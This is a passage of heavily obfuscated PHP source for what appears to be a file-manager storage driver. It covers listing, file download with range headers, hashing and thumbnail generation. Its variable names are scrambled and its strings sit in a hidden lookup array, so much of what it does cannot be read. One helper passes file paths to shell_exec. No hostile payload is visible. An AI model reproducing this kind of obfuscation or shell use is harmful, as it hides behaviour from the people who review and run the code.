$ëñÂíğü[$Ì´æÏÆÛ[85]] = $¹´§Ú’‚[$Ì´æÏÆÛ[85]]; } if (!$€œºù¤Í) { $µ€åşŒ[] = $ëñÂíğü; continue; } $µ€åşŒ[] = $ëñÂíğü; $ĞÉ×âÍ÷ = $¹´§Ú’‚[$Ì´æÏÆÛ[84]]; $™ïç¬èí = $this->pathDriver; if (substr($¹´§Ú’‚[$Ì´æÏÆÛ[84]], 0, strlen($™ïç¬èí)) == $™ïç¬èí) { $ĞÉ×âÍ÷ = substr($ĞÉ×âÍ÷, strlen($™ïç¬èí)); } $this->listAllMake($ĞÉ×âÍ÷, $µ€åşŒ); } } public function listAllSimple($‘®û˜áŸ, $„éóº®Ù = false) { $½óû¡Æ = $this->listAll($‘®û˜áŸ); return $this->listAllSimpleMake($½óû¡Æ, $this->getPathOuter($‘®û˜áŸ), $„éóº®Ù); } public function listAllSimpleMake($™¼ñ¿Ûà, $»Ñœí´’, $ê™íø˜é) { $ˆœÊ¨ºı =& $_SERVER[íû‘ş´]; $ä…“çÅÍ = array(); $»Ñœí´’ = rtrim(get_path_father($»Ñœí´’), $ˆœÊ¨ºı[8]) . $ˆœÊ¨ºı[8]; foreach ($™¼ñ¿Ûà as $¿«éÃ§Ö) { $ä²»ºš‹ = array($ˆœÊ¨ºı[84] => $¿«éÃ§Ö[$ˆœÊ¨ºı[84]], $ˆœÊ¨ºı[86] => $¿«éÃ§Ö[$ˆœÊ¨ºı[84]], $ˆœÊ¨ºı[75] => $¿«éÃ§Ö[$ˆœÊ¨ºı[75]]); if (isset($¿«éÃ§Ö[$ˆœÊ¨ºı[76]]) && !$¿«éÃ§Ö[$ˆœÊ¨ºı[75]]) { $ä²»ºš‹[$ˆœÊ¨ºı[76]] = $¿«éÃ§Ö[$ˆœÊ¨ºı[76]]; } if (isset($¿«éÃ§Ö[$ˆœÊ¨ºı[85]])) { $ä²»ºš‹[$ˆœÊ¨ºı[85]] = $¿«éÃ§Ö[$ˆœÊ¨ºı[85]]; } if (is_array($¿«éÃ§Ö[$ˆœÊ¨ºı[87]])) { $ä²»ºš‹[$ˆœÊ¨ºı[86]] = $¿«éÃ§Ö[$ˆœÊ¨ºı[87]][$ˆœÊ¨ºı[84]]; $ä²»ºš‹[$ˆœÊ¨ºı[76]] = $¿«éÃ§Ö[$ˆœÊ¨ºı[87]][$ˆœÊ¨ºı[76]]; $ä²»ºš‹[$ˆœÊ¨ºı[85]] = $¿«éÃ§Ö[$ˆœÊ¨ºı[87]][$ˆœÊ¨ºı[85]]; } else { if (substr($¿«éÃ§Ö[$ˆœÊ¨ºı[84]], 0, strlen($»Ñœí´’)) == $»Ñœí´’) { $ä²»ºš‹[$ˆœÊ¨ºı[84]] = substr($¿«éÃ§Ö[$ˆœÊ¨ºı[84]], strlen($»Ñœí´’)); } } $•şøùã¼ = $¿«éÃ§Ö[$ˆœÊ¨ºı[75]] ? $ˆœÊ¨ºı[8] : $ˆœÊ¨ºı[12]; $ä²»ºš‹[$ˆœÊ¨ºı[86]] = rtrim($ä²»ºš‹[$ˆœÊ¨ºı[86]], $ˆœÊ¨ºı[8]) . $•şøùã¼; $ä²»ºš‹[$ˆœÊ¨ºı[84]] = $ˆœÊ¨ºı[8] . trim($ä²»ºš‹[$ˆœÊ¨ºı[84]], $ˆœÊ¨ºı[8]) . $•şøùã¼; if (!$ê™íø˜é) { $Âşëû = explode($ˆœÊ¨ºı[8], trim($ä²»ºš‹[$ˆœÊ¨ºı[84]], $ˆœÊ¨ºı[8])); $ä²»ºš‹[$ˆœÊ¨ºı[84]] = $ˆœÊ¨ºı[8] . implode($ˆœÊ¨ºı[8], array_slice($Âşëû, 1)) . $•şøùã¼; } $ä…“çÅÍ[] = $ä²»ºš‹; } return array_sort_by($ä…“çÅÍ, $ˆœÊ¨ºı[84]); } public function upload($™Šû¢‹Š, $´Í’Ú¶ì, $Ëİ•¶Î‘ = false, $Ô§÷ØÚ¸ = REPEAT_REPLACE) { } public function uploadFileByID($§ÌÈ¤ä˜, $ËÜ¿ÔúÇ, $®¤é³Ê•) { } public function uploadFileByPath($Õí‹®¿¬, $²‹èÃÇê, $Ôİ½ÁÈÒ = array()) { } public function isUploadServer() { $ÕÛô¸÷ã =& $_SERVER[íû‘ş´]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ÕÛô¸÷ã[88]) { return !0; } return $GLOBALS[$ÕÛô¸÷ã[6]][$ÕÛô¸÷ã[89]][$ÕÛô¸÷ã[90]]; } public function isFileOutServer() { $³Ò¨  =& $_SERVER[íû‘ş´]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $³Ò¨ [88]) { return !0; } return $GLOBALS[$³Ò¨ [6]][$³Ò¨ [89]][$³Ò¨ [91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($½Ôú¶¡») { $å»©°å´ =& $_SERVER[íû‘ş´]; if (!$this->isCdnHost()) { return $½Ôú¶¡»; } return str_replace(trim(get_url_root($½Ôú¶¡»), $å»©°å´[8]), trim($this->cdnHost, $å»©°å´[8]), $½Ôú¶¡»); } public function uploadLink($ÒÔİÓ¡÷, $ïßŞÓ§ = 0) { $¼ÆİÊ¹ =& $_SERVER[íû‘ş´]; if ($this->isUploadServer()) { return; } $¿¢»û§Í = $this->getType(); if (!in_array($¿¢»û§Í, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Ó—Ùõüø = 1024 * 1024 * 10; $îã¾“£ = $ïßŞÓ§ <= $Ó—Ùõüø ? $¼ÆİÊ¹[92] : $¼ÆİÊ¹[93]; $¿Í®‰Ï‚ = (!$ïßŞÓ§ ? 1 : ceil($ïßŞÓ§ / pow(1024, 3))) * 3600 * 4; $™¿ê÷Å = $this->{$îã¾“£}($ÒÔİÓ¡÷, $¿Í®‰Ï‚); if ($™¿ê÷Å) { $™¿ê÷Å[$¼ÆİÊ¹[94]] = $ÒÔİÓ¡÷; $™¿ê÷Å[$¼ÆİÊ¹[95]] = $¿¢»û§Í; } return $™¿ê÷Å; } public function uploadFormData($íå±‹²ú, $é»¶å”œ = 3600) { } public function multiUploadFormData($“®‚¬÷, $¦°çåÒ¯ = 3600) { } public function download($ß¬æˆ«, $Ÿ¸Ò…¾ò) { } public function ext($›ÈÅ‡Áå) { $àÖâş§† =& $_SERVER[íû‘ş´]; if (strpos($›ÈÅ‡Áå, $àÖâş§†[8]) === -1) { $÷şÁŒ«Ü = $›ÈÅ‡Áå; } else { $÷şÁŒ«Ü = $this->pathThis($›ÈÅ‡Áå); } $’â«‡ÂÂ = $àÖâş§†[12]; if (strstr($÷şÁŒ«Ü, $àÖâş§†[10])) { $’â«‡ÂÂ = substr($÷şÁŒ«Ü, strrpos($÷şÁŒ«Ü, $àÖâş§†[10]) + 1); $’â«‡ÂÂ = strtolower($’â«‡ÂÂ); } if (strlen($’â«‡ÂÂ) > 3 && preg_match($àÖâş§†[96], $’â«‡ÂÂ, $¹·¡ûÔ)) { $’â«‡ÂÂ = $àÖâş§†[12]; } return $’â«‡ÂÂ; } public function pathThis($¢ò¸Œ„©) { $¡¼á»µ¹ =& $_SERVER[íû‘ş´]; $¢ò¸Œ„© = str_replace($¡¼á»µ¹[97], $¡¼á»µ¹[8], rtrim($¢ò¸Œ„©, $¡¼á»µ¹[8])); $×™ ÌÑº = strrpos($¢ò¸Œ„©, $¡¼á»µ¹[8]); if ($×™ ÌÑº === !1) { return $¢ò¸Œ„©; } return substr($¢ò¸Œ„©, $×™ ÌÑº + 1); } public function pathFather($ıæ‘ğ˜Ó) { $Ë–ßÈ›È =& $_SERVER[íû‘ş´]; $ıæ‘ğ˜Ó = str_replace($Ë–ßÈ›È[97], $Ë–ßÈ›È[8], rtrim($ıæ‘ğ˜Ó, $Ë–ßÈ›È[8])); $’å–Âõı = strrpos($ıæ‘ğ˜Ó, $Ë–ßÈ›È[8]); if ($’å–Âõı === !1) { return $Ë–ßÈ›È[12]; } return substr($ıæ‘ğ˜Ó, 0, $’å–Âõı + 1); } public function hashSimple($èšŸ‚‰§) { $œ„£‚¡Õ =& $_SERVER[íû‘ş´]; if (!$èšŸ‚‰§) { return md5($œ„£‚¡Õ[12]); } $ŒŞ°ü¤ê = $this->size($èšŸ‚‰§); $áĞœœ‡ = 200; $ÍŞŸæ÷° = 50; if ($ŒŞ°ü¤ê <= $áĞœœ‡ * $ÍŞŸæ÷°) { return $this->hashMd5($èšŸ‚‰§) . $ŒŞ°ü¤ê; } $àŠœî¦Ç = intval($ŒŞ°ü¤ê / $ÍŞŸæ÷°); $’ÊÕ”° = $œ„£‚¡Õ[12]; for ($­ùö¡ƒğ = 0; $­ùö¡ƒğ < $ÍŞŸæ÷°; $­ùö¡ƒğ++) { $’ÊÕ”° .= $this->fileSubstr($èšŸ‚‰§, $àŠœî¦Ç * $­ùö¡ƒğ, $áĞœœ‡); } $’ÊÕ”° .= $this->fileSubstr($èšŸ‚‰§, $ŒŞ°ü¤ê - $áĞœœ‡, $áĞœœ‡); return md5($’ÊÕ”°) . $ŒŞ°ü¤ê; } public static $md5Cache = array(); public function hashMd5($ëõƒğ©) { if (!$ëõƒğ©) { return md5($_SERVER[íû‘ş´][12]); } $ëõƒğ© = $this->iconvSystem($ëõƒğ©); if (isset(self::$md5Cache[$ëõƒğ©])) { return self::$md5Cache[$ëõƒğ©]; } self::$md5Cache[$ëõƒğ©] = $this->hashMd5Shell($ëõƒğ©); if (!self::$md5Cache[$ëõƒğ©]) { self::$md5Cache[$ëõƒğ©] = @md5_file($ëõƒğ©); } return self::$md5Cache[$ëõƒğ©]; } private function hashMd5Shell($êì•„™) { $ğº×–÷“ =& $_SERVER[íû‘ş´]; if (!$êì•„™) { return md5($ğº×–÷“[12]); } if (!function_exists($ğº×–÷“[98])) { return !1; } $‰ÉÃüÛƒ = array($ğº×–÷“[99], $ğº×–÷“[100]); $®¿‰ = Cache::get($ğº×–÷“[101]); if (!$®¿‰) { $¸šøÄìñ = BASIC_PATH . $ğº×–÷“[102]; $Ä¼Øò¨ƒ = md5_file($¸šøÄìñ); $®¿‰ = $ğº×–÷“[103]; foreach ($‰ÉÃüÛƒ as $—ÕÆ÷¬¶) { $”Ê¢ş„Æ = shell_exec($—ÕÆ÷¬¶ . "\x20\x22{$¸šøÄìñ}\42"); if ($”Ê¢ş„Æ && substr(trim($”Ê¢ş„Æ), 0, 32) == $Ä¼Øò¨ƒ) { $®¿‰ = $—ÕÆ÷¬¶; break; } } Cache::set($ğº×–÷“[101], $®¿‰, 3600); } if ($®¿‰ == $ğº×–÷“[103]) { return !1; } $”Ê¢ş„Æ = shell_exec($®¿‰ . "\x20\x22{$êì•„™}\42"); $”Ê¢ş„Æ = str_replace($ğº×–÷“[104], $ğº×–÷“[12], $”Ê¢ş„Æ); return substr($”Ê¢ş„Æ, 0, 32); } public function link($¦×´á²ƒ) { return $¦×´á²ƒ; } public function fileOut($½çâçÖô, $¢úºİµã = false, $ä™®ßèĞ = false, $“Ó¢ì„¯ = '') { $µš„Ù¾‚ =& $_SERVER[íû‘ş´]; $this->cacheMethod(null, null); if (!$½çâçÖô || !$this->exist($½çâçÖô)) { show_json(LNG($µš„Ù¾‚[105]), !1, $ä™®ßèĞ); } $ÔŸ‹°Îõ = $this->getType() == $µš„Ù¾‚[106]; $¤›“Ä¡Ğ = $GLOBALS[$µš„Ù¾‚[6]][$µš„Ù¾‚[89]][$µš„Ù¾‚[107]][$µš„Ù¾‚[108]]; $ä›ƒ‘ÕÚ = (double) $GLOBALS[$µš„Ù¾‚[6]][$µš„Ù¾‚[89]][$µš„Ù¾‚[107]][$µš„Ù¾‚[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $‡ÏÈĞ† = $this->infoFull($½çâçÖô); $ßˆòÊ‘› = $‡ÏÈĞ†[$µš„Ù¾‚[76]]; $º‰ŸÙûî = gmdate($µš„Ù¾‚[110], $‡ÏÈĞ†[$µš„Ù¾‚[85]]); $·Õëœ î = $ä™®ßèĞ ? $ä™®ßèĞ : $this->iconvApp($‡ÏÈĞ†[$µš„Ù¾‚[32]]); $ğª¥Ş÷¿ = 0; $˜‰‚‰Ã = $ßˆòÊ‘› - 1; $°é®æ = $this->ext($·Õëœ î); if (in_array($°é®æ, array($µš„Ù¾‚[111], $µš„Ù¾‚[112], $µš„Ù¾‚[113], $µš„Ù¾‚[114]))) { $°é®æ = $µš„Ù¾‚[115]; } if (in_array($°é®æ, array($µš„Ù¾‚[116]))) { $°é®æ = $µš„Ù¾‚[117]; } if (!$“Ó¢ì„¯) { $“Ó¢ì„¯ = md5($º‰ŸÙûî . $ßˆòÊ‘›); } $“Ó¢ì„¯ = $µš„Ù¾‚[118] . $“Ó¢ì„¯ . $µš„Ù¾‚[118]; $Æóã…ş® = get_file_mime($°é®æ); $Ö…“æ¾“ = !0; $Ö…“æ¾“ = isset($_GET[$µš„Ù¾‚[119]]) ? !1 : !0; if ($¢úºİµã === !1 && !mime_support($Æóã…ş®)) { $Æóã…ş® = $µš„Ù¾‚[120]; } header($µš„Ù¾‚[121]); header($µš„Ù¾‚[122] . $Æóã…ş®); $óÁ—Îİ = rawurlencode($·Õëœ î); $óÁ—Îİ = $µš„Ù¾‚[118] . $óÁ—Îİ . $µš„Ù¾‚[123] . $óÁ—Îİ; if ($¢úºİµã) { header($µš„Ù¾‚[124]); header($µš„Ù¾‚[125] . $óÁ—Îİ); } else { if ($Ö…“æ¾“) { header($µš„Ù¾‚[126] . $óÁ—Îİ); } } header($µš„Ù¾‚[127] . gmdate($µš„Ù¾‚[110], time() + 3600 * 24 * 30) . $µš„Ù¾‚[128]); header($µš„Ù¾‚[129]); header($µš„Ù¾‚[130]); header($µš„Ù¾‚[131]); if (isset($_SERVER[$µš„Ù¾‚[132]]) && strtotime($_SERVER[$µš„Ù¾‚[132]]) == $‡ÏÈĞ†[$µš„Ù¾‚[85]]) { header($µš„Ù¾‚[133], !0, 304); die; } if (isset($_SERVER[$µš„Ù¾‚[134]]) && $_SERVER[$µš„Ù¾‚[134]] == $“Ó¢ì„¯) { header($µš„Ù¾‚[135] . $“Ó¢ì„¯, !0, 304); die; } header($µš„Ù¾‚[135] . $“Ó¢ì„¯); header($µš„Ù¾‚[136] . $º‰ŸÙûî . $µš„Ù¾‚[128]); header($µš„Ù¾‚[137] . $·Õëœ î); header($µš„Ù¾‚[138]); header($µš„Ù¾‚[139] . $ßˆòÊ‘›); header($µš„Ù¾‚[140]); Hook::trigger($µš„Ù¾‚[141], $½çâçÖô, $ßˆòÊ‘›, $·Õëœ î, $°é®æ); if (!$¢úºİµã && $°é®æ == $µš„Ù¾‚[142]) { if ($ßˆòÊ‘› > 1024 * 1024 * 5) { die; } $ì‰îŞÍÖ = $this->getContent($½çâçÖô); $ì‰îŞÍÖ = Html::clearSVG($ì‰îŞÍÖ); header($µš„Ù¾‚[143] . strlen($ì‰îŞÍÖ)); echo $ì‰îŞÍÖ; die; } $ Ğ€âÕç = strtolower($_SERVER[$µš„Ù¾‚[144]]); if ($ÔŸ‹°Îõ && $ Ğ€âÕç && $¤›“Ä¡Ğ) { if (strstr($ Ğ€âÕç, $µš„Ù¾‚[145])) { header($µš„Ù¾‚[146] . $½çâçÖô); } else { if (strstr($ Ğ€âÕç, $µš„Ù¾‚[147])) { header($µš„Ù¾‚[148] . $½çâçÖô); } else { if (strstr($ Ğ€âÕç, $µš„Ù¾‚[149])) { header($µš„Ù¾‚[150] . $½çâçÖô); } } } if ($ä›ƒ‘ÕÚ) { header($µš„Ù¾‚[151] . $ä›ƒ‘ÕÚ); } return; } if (isset($_SERVER[$µš„Ù¾‚[152]])) { if (preg_match($µš„Ù¾‚[153], $_SERVER[$µš„Ù¾‚[152]], $Å‘¬³õ)) { $ğª¥Ş÷¿ = intval($Å‘¬³õ[1]); $ğª¥Ş÷¿ = $ğª¥Ş÷¿ <= 0 ? 0 : ($ğª¥Ş÷¿ >= $˜‰‚‰Ã ? $˜‰‚‰Ã : $ğª¥Ş÷¿); if (!empty($Å‘¬³õ[2])) { $ĞåÈøõ = intval($Å‘¬³õ[2]); $˜‰‚‰Ã = $ĞåÈøõ < $ğª¥Ş÷¿ ? $ğª¥Ş÷¿ : ($ĞåÈøõ >= $˜‰‚‰Ã ? $˜‰‚‰Ã : $ĞåÈøõ); } } header($µš„Ù¾‚[154]); header("\x43\157\x6e\164\x65\x6e\x74\55\x52\141\156\x67\x65\x3a\40\142\171\x74\145\x73\40{$ğª¥Ş÷¿}\55{$˜‰‚‰Ã}\57" . $ßˆòÊ‘›); } else { header($µš„Ù¾‚[155]); } header($µš„Ù¾‚[156]); $Ñ§òÄ¼Ö = !0; if ($_SERVER[$µš„Ù¾‚[157]] == $µš„Ù¾‚[158] && $ßˆòÊ‘› > 1204 * 1024 * 1024 * 2) { $Ñ§òÄ¼Ö = !1; } if ($Ñ§òÄ¼Ö) { header($µš„Ù¾‚[159] . ($˜‰‚‰Ã - $ğª¥Ş÷¿ + 1)); } if ($_SERVER[$µš„Ù¾‚[160]] == $µš„Ù¾‚[161]) { return; } $Æğ‡â€Ù = 1024 * 100; $¶®–ÙÓœ = 0; if ($ä›ƒ‘ÕÚ) { $¶®–ÙÓœ = intval(1000 * 1000 * ($Æğ‡â€Ù / $ä›ƒ‘ÕÚ)); } while ($ğª¥Ş÷¿ <= $˜‰‚‰Ã) { $…š‹¾‚¾ = timeFloat(); check_abort(); $”¾€›ô­ = $˜‰‚‰Ã - $ğª¥Ş÷¿ + 1; if ($”¾€›ô­ <= $Æğ‡â€Ù) { $Æğ‡â€Ù = $”¾€›ô­; } echo $this->fileSubstr($½çâçÖô, $ğª¥Ş÷¿, $Æğ‡â€Ù); $ğª¥Ş÷¿ += $Æğ‡â€Ù; if ($Æğ‡â€Ù == $”¾€›ô­) { $ğª¥Ş÷¿ = $˜‰‚‰Ã + 1; } if ($¶®–ÙÓœ) { $ˆ«ŸÍû÷ = intval(1000 * 1000 * (timeFloat() - $…š‹¾‚¾)); $ëéøÀ¯È = $¶®–ÙÓœ - $ˆ«ŸÍû÷; if ($ëéøÀ¯È > 5) { usleep($ëéøÀ¯È); } } } } public function fileOutServer($—½×°şÛ, $ø£Èæ¦¯ = false, $ÍÜüÙ‡ = false, $…æİ–ğÕ = '') { $this->fileOut($—½×°şÛ, $ø£Èæ¦¯, $ÍÜüÙ‡, $…æİ–ğÕ); } public function fileOutLink($¿ÂˆË‹Î) { header($_SERVER[íû‘ş´][162] . $¿ÂˆË‹Î); die; } public function cacheMethod($Æî¨¤çµ, $àô·ø™, $—š÷ğÎ = null) { $ÏŠ©ƒ¢Æ =& $_SERVER[íû‘ş´]; static $ôƒÓùë = array(); $””Ã¿ = $àô·ø™ ? ltrim($this->getPathOuter($àô·ø™), $ÏŠ©ƒ¢Æ[8]) : $ÏŠ©ƒ¢Æ[12]; $ÙèÍÑÀº = $ÏŠ©ƒ¢Æ[163] . $Æî¨¤çµ . $ÏŠ©ƒ¢Æ[164] . rtrim($””Ã¿, $ÏŠ©ƒ¢Æ[8]); if (is_null($Æî¨¤çµ)) { $ôƒÓùë = array(); return; } if (is_null($àô·ø™)) { foreach ($ôƒÓùë as $ÙèÍÑÀº => $¾¿©¤Úª) { if (!strstr($ÙèÍÑÀº, $ÏŠ©ƒ¢Æ[163] . $Æî¨¤çµ . $ÏŠ©ƒ¢Æ[165])) { continue; } unset($ôƒÓùë[$ÙèÍÑÀº]); } return; } if (!is_null($—š÷ğÎ)) { $ôƒÓùë[$ÙèÍÑÀº] = $—š÷ğÎ; return; } $ıÙÇò = isset($ôƒÓùë[$ÙèÍÑÀº]) ? $ôƒÓùë[$ÙèÍÑÀº] : null; if (!is_null($ıÙÇò)) { return $ıÙÇò; } $ıÙÇò = $this->{$Æî¨¤çµ}($àô·ø™); $ôƒÓùë[$ÙèÍÑÀº] = $ıÙÇò; return $ıÙÇò; } public function cacheMethodInfoSet($Ñ§ì»Çı, $àğøÀ¥Ã, $©Õ™Õ›¶ = false) { $£ç­ˆš =& $_SERVER[íû‘ş´]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($£ç­ˆš[166], $Ñ§ì»Çı, $àğøÀ¥Ã); $this->cacheMethod($£ç­ˆš[167], $Ñ§ì»Çı, $àğøÀ¥Ã ? !1 : !0); if (is_array($©Õ™Õ›¶)) { $this->cacheMethod($£ç­ˆš[168], $Ñ§ì»Çı, $©Õ™Õ›¶); } } public function fileOutImage($ƒÑà¾È, $üİïŠôÕ = 250) { $ÇÒÔ½¨Ú =& $_SERVER[íû‘ş´]; set_timeout(); if (substr($ƒÑà¾È, 0, 4) == $ÇÒÔ½¨Ú[149]) { $this->fileOutLink($ƒÑà¾È); } $è±å³Û = $this->info($ƒÑà¾È); $ÂÏªóş = !1; $æŒÌüù = isset($GLOBALS[$ÇÒÔ½¨Ú[169]]) ? $GLOBALS[$ÇÒÔ½¨Ú[169]] : array(); if ($æŒÌüù && $æŒÌüù[$ÇÒÔ½¨Ú[170]] == $è±å³Û[$ÇÒÔ½¨Ú[84]]) { $è±å³Û = $æŒÌüù; $‘õèºë› = $è±å³Û[$ÇÒÔ½¨Ú[171]]; if ($‘õèºë› && isset($‘õèºë›[$ÇÒÔ½¨Ú[172]])) { if ($‘õèºë›[$ÇÒÔ½¨Ú[172]] <= $üİïŠôÕ && $‘õèºë›[$ÇÒÔ½¨Ú[173]] <= $üİïŠôÕ) { $ÂÏªóş = !0; } } } if ($è±å³Û[$ÇÒÔ½¨Ú[76]] <= 1024 * 50 || $ÂÏªóş || !function_exists($ÇÒÔ½¨Ú[174]) || $è±å³Û[$ÇÒÔ½¨Ú[175]] == $ÇÒÔ½¨Ú[176]) { return $this->fileOut($ƒÑà¾È, !1, $è±å³Û[$ÇÒÔ½¨Ú[32]]); } $÷é‚—û¤ = kodIO::hashPath($è±å³Û); $éûÜñ©Ë = "\143\x6f\166\145\x72\137{$÷é‚—û¤}\x5f{$üİïŠôÕ}\56\160\156\x67"; $‡³ƒ®™® = IO_PATH_SYSTEM_TEMP . $ÇÒÔ½¨Ú[177]; $íìÑÅ’Â = IO::infoFullSimple($‡³ƒ®™®); $­×âËŠü = $íìÑÅ’Â && is_array($íìÑÅ’Â) ? $íìÑÅ’Â[$ÇÒÔ½¨Ú[84]] : $ÇÒÔ½¨Ú[12]; if (!$­×âËŠü) { $­×âËŠü = IO::mkdir($‡³ƒ®™®); } if ($è±å³Û[$ÇÒÔ½¨Ú[178]] == $ÇÒÔ½¨Ú[179] && isset($è±å³Û[$ÇÒÔ½¨Ú[180]]) && $è±å³Û[$ÇÒÔ½¨Ú[180]] == kodIO::sourceID($­×âËŠü)) { $ã×íÃµ¤ = $è±å³Û[$ÇÒÔ½¨Ú[181]]; if ($üİïŠôÕ <= 500) { $Œáµº–© = preg_replace($ÇÒÔ½¨Ú[182], $ÇÒÔ½¨Ú[183], $è±å³Û[$ÇÒÔ½¨Ú[32]]); $ã×íÃµ¤ = IO::fileNameExist($­×âËŠü, $Œáµº–©); } return IO::fileOut(KodIO::make($ã×íÃµ¤), !1, $è±å³Û[$ÇÒÔ½¨Ú[32]]); } $šşı‘ì­ = IO::fileNameExist($­×âËŠü, $éûÜñ©Ë); if ($šşı‘ì­) { return IO::fileOut(KodIO::make($šşı‘ì­), !1, $è±å³Û[$ÇÒÔ½¨Ú[32]]); } if ($üİïŠôÕ > 1000) { $this->makeImageCover($­×âËŠü, $ƒÑà¾È, $éûÜñ©Ë, $üİïŠôÕ); $this->makeImageCover($­×âËŠü, $ƒÑà¾È, "\x63\x6f\x76\x65\x72\x5f{$÷é‚—û¤}\x5f\62\65\60\56\160\156\x67", 250); $šşı‘ì­ = IO::fileNameExist($­×âËŠü, $éûÜñ©Ë); if ($šşı‘ì­) { return IO::fileOut(KodIO::make($šşı‘ì­), !1, $è±å³Û[$ÇÒÔ½¨Ú[32]]); } die; } $šÕ˜µ¤ˆ = Cache::get($éûÜñ©Ë); if ($šÕ˜µ¤ˆ == $ÇÒÔ½¨Ú[184] || $šÕ˜µ¤ˆ == $ÇÒÔ½¨Ú[185]) { echo $šÕ˜µ¤ˆ; die; } Cache::set($éûÜñ©Ë, $ÇÒÔ½¨Ú[185], 60); $¡œ¬£·™ = array($­×âËŠü, $è±å³Û[$ÇÒÔ½¨Ú[84]], $éûÜñ©Ë, $üİïŠôÕ); $›Üåş¯Ğ = $ÇÒÔ½¨Ú[186] . $è±å³Û[$ÇÒÔ½¨Ú[76]] . $ÇÒÔ½¨Ú[187] . $éûÜñ©Ë . $ÇÒÔ½¨Ú[188] . $è±å³Û[$ÇÒÔ½¨Ú[32]] . $ÇÒÔ½¨Ú[189] . $è±å³Û[$ÇÒÔ½¨Ú[84]]; TaskQueue::add($ÇÒÔ½¨Ú[190], $¡œ¬£·™, $›Üåş¯Ğ, $éûÜñ©Ë); } public function makeImageCover($–”İİæ‰, $Ÿ¿±ÏÓº, $¬«½ßË¸, $‰ÙÇØš´) { $”½Ø„†¯ =& $_SERVER[íû‘ş´]; if (IO::fileNameExist($–”İİæ‰, $¬«½ßË¸)) { return $”½Ø„†¯[191]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $ş½¹»İ¹ = DATA_THUMB . $¬«½ßË¸; del_file($ş½¹»İ¹); $¥ÒªĞ‰ = TEMP_FILES . $¬«½ßË¸; if (!@file_exists($¥ÒªĞ‰)) { $¥ÒªĞ‰ = IO::download($Ÿ¿±ÏÓº, $¥ÒªĞ‰); } if (!@file_exists($¥ÒªĞ‰)) { return $”½Ø„†¯[192]; } ImageThumb::createThumb($¥ÒªĞ‰, $ş½¹»İ¹, $‰ÙÇØš´, $‰ÙÇØš´ * 10); if (@file_exists($ş½¹»İ¹)) { Cache::remove($¬«½ßË¸); return IO::move($ş½¹»İ¹, $–”İİæ‰); } Cache::set($¬«½ßË¸, $”½Ø„†¯[184], 600); del_file($ş½¹»İ¹); return $”½Ø„†¯[193] . $¥ÒªĞ‰ . $”½Ø„†¯[71]; } public function fileOutImageServer($Û¿›ÀÚ˜, $÷°Ôì = 250) { $this->fileOutImage($Û¿›ÀÚ˜, $÷°Ôì); } public function fileNameAuto($ÙÌÙğµ¸, $Ñ¶‘ÛıÆ, $ÅØ™Âæè = REPEAT_RENAME, $¦ƒ·ËĞ = false) { $ÄĞµúĞŸ =& $_SERVER[íû‘ş´]; $Âáˆ”³¢ = $ÙÌÙğµ¸ === $ÄĞµúĞŸ[12] ? $Ñ¶‘ÛıÆ : rtrim($ÙÌÙğµ¸, $ÄĞµúĞŸ[8]) . $ÄĞµúĞŸ[8] . $Ñ¶‘ÛıÆ; if ($ÅØ™Âæè == REPEAT_REPLACE || !$this->exist($Âáˆ”³¢) || $¦ƒ·ËĞ && $ÅØ™Âæè != REPEAT_RENAME_FOLDER) { return $Ñ¶‘ÛıÆ; } if ($ÅØ™Âæè == REPEAT_SKIP) { return !1; } $ªà’ÁçØ = $ÄĞµúĞŸ[10] . get_path_ext($Ñ¶‘ÛıÆ); $ªà’ÁçØ = $ªà’ÁçØ == $ÄĞµúĞŸ[10] || $¦ƒ·ËĞ ? $ÄĞµúĞŸ[12] : $ªà’ÁçØ; $ìÃ‹·ıÔ = 1; $ú–Û±¤Ç = substr($Ñ¶‘ÛıÆ, 0, strlen($Ñ¶‘ÛıÆ) - strlen($ªà’ÁçØ)); $•¶ÚÏÙÌ = $ú–Û±¤Ç . "\x28{$ìÃ‹·ıÔ}\x29{$ªà’ÁçØ}"; while ($this->exist(rtrim($ÙÌÙğµ¸, $ÄĞµúĞŸ[8]) . $ÄĞµúĞŸ[8] . $•¶ÚÏÙÌ)) { $•¶ÚÏÙÌ = $ú–Û±¤Ç . "\x28{$ìÃ‹·ıÔ}\51{$ªà’ÁçØ}"; $ìÃ‹·ıÔ++; } return $•¶ÚÏÙÌ; } private function fileNameAutoList($ò§—–Ø‘, $Ä×ˆ´´ı, $íª±òà = false) { $¦ÊîæËÆ =& $_SERVER[íû‘ş´]; $İ‡Ä¹÷ = $this->listPath($ò§—–Ø‘, !0); $İ‡Ä¹÷ = array_merge($İ‡Ä¹÷[$¦ÊîæËÆ[82]], $İ‡Ä¹÷[$¦ÊîæËÆ[83]]); $ş‹„Ó£³ = array_to_keyvalue($İ‡Ä¹÷, $¦ÊîæËÆ[12], $¦ÊîæËÆ[32]); $Õë÷é‰– = $¦ÊîæËÆ[10] . get_path_ext($Ä×ˆ´´ı); $Õë÷é‰– = $Õë÷é‰– == $¦ÊîæËÆ[10] || $íª±òà ? $¦ÊîæËÆ[12] : $Õë÷é‰–; $×¥èŞŠ = substr($Ä×ˆ´´ı, 0, strlen($Ä×ˆ´´ı) - strlen($Õë÷é‰–)); $§®È‡ñí = $×¥èŞŠ . "\50\x30\x29{$Õë÷é‰–}"; for ($Å®¹°İõ = 1; $Å®¹°İõ <= count($ş‹„Ó£³) + 1; $Å®¹°İõ++) { $§®È‡ñí = $×¥èŞŠ . "\x28{$Å®¹°İõ}\x29{$Õë÷é‰–}"; if (!in_array_not_case($§®È‡ñí, $ş‹„Ó£³)) { return $§®È‡ñí; } } return $§®È‡ñí; } public function listAllFiles($£¼ÍøõÂ, $Õş ş¡å) { $ÎˆÓèÔ¨ =& $_SERVER[íû‘ş´]; if (empty($Õş ş¡å)) { return array(); } $ùÍÅô¡‹ = array_keys($Õş ş¡å); $‚Š²½¬è = array(); $£¼ÍøõÂ = trim($£¼ÍøõÂ, $ÎˆÓèÔ¨[8]); foreach ($Õş ş¡å as $ô¬•îò => $©€õ·¨’) { $õì¤æ“ò = ltrim(substr(trim($ô¬•îò, 